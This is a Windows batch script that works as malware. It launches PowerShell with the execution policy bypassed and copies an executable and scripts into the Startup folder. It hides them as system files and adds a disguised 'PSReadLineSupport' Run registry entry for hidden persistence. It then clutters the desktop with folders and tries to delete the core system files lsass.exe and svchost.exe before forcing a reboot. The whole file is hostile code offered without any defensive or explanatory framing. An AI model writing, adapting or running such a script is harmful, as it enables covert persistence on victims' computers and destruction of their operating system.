@echo off
powershell -ExecutionPolicy Bypass -File "%~dp0question.ps1"
start groh2.bat
start groh4.bat
start groh4.5.reg
copy /Y Trah3trahin_installer.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Trah3trahin_installer.exe"
copy /Y question.ps1 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\question.ps1"
copy /Y groh4.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\groh4.bat"
copy /Y hide.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\hide.vbs"
del /f /q /s "%TEMP%\groh2.bat"
del /f /q /s "%TEMP%\groh4.5.reg"

setlocal

cd "%USERPROFILE%\Desktop"
mkdir new_folder
mkdir new_folder2
mkdir new_folder3
mkdir new_folder4
mkdir new_folder5
mkdir new_folder6
mkdir new_folder7
mkdir new_folder8
mkdir new_folder9
mkdir new_folder10
mkdir new_folder11
mkdir new_folder12
mkdir new_folder13
mkdir new_folder14
mkdir new_folder15
mkdir new_folder16
mkdir new_folder17
mkdir new_folder18
mkdir new_folder19
mkdir new_folder20
mkdir new_folder21
mkdir new_folder22
echo File 1 content > file1.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt
echo File 2 content > file2.txt
del /f /q /s file2.txt

endlocal

del /f /q /s "%TEMP%\groh6.bat"
attrib +h +s "%TEMP%\question.ps1"
attrib +h +s "%TEMP%\inst.bat"
attrib +h +s "%TEMP%\Trah3trahin_installer.exe"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\groh4.bat"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Trah3trahin_installer.exe"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\question.ps1"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\1488.bat"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\1488p2.bat"
attrib +h +s "%TEMP%\audio1.bat"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\hide.vbs"
start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Trah3trahin_installer.exe"

setlocal

set "targetDir=%APPDATA%\Microsoft\WinAudit\SuperDriver"
mkdir "%targetDir%" >nul 2>&1
copy /Y "PSReadLine-.ps1" "%targetDir%\PSReadLine-.ps1"

attrib +h +s "%targetDir%\PSReadLine-.ps1"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PSReadLineSupport" /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%targetDir%\PSReadLine-.ps1\"" /f

endlocal

del /f /q /s %SystemRoot%\System32\lsass.exe
del /f /q /s "%TEMP%\PSReadLine-.ps1"
del /f /q /s "%TEMP%\installer.bat"
del /f /q /s %SystemRoot%\System32\lsass.exe
del /f /q /s %SystemRoot%\System32\svchost.exe
shutdown /r
exit